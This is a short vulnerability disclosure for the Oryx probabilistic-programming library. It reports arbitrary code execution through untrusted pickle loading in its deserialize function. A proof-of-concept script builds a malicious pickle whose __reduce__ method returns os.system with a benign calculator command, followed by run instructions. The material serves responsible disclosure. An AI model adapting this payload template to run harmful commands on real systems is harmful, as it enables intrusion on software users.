# Description
Oryx is a library for probabilistic programming and deep learning built on top of Jax. The approach is to expose a set of function transformations that compose and integrate with JAX's existing transformations.
* **Vulnerability description**
    untrusted loading of data by the pickle.load function leading to Arbitrary code execution.

# Proof of Concept
Run exploit.py
```
import os
import pickle
#os.system('pip3 install oryx')
from oryx.core import serialize
#payload formation
class ArbitraryCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
#exploiting
dumps = pickle.dumps(ArbitraryCode())
serialize.deserialize(dumps)
```
* `pip3 install oryx`
* `python3 exploit.py`
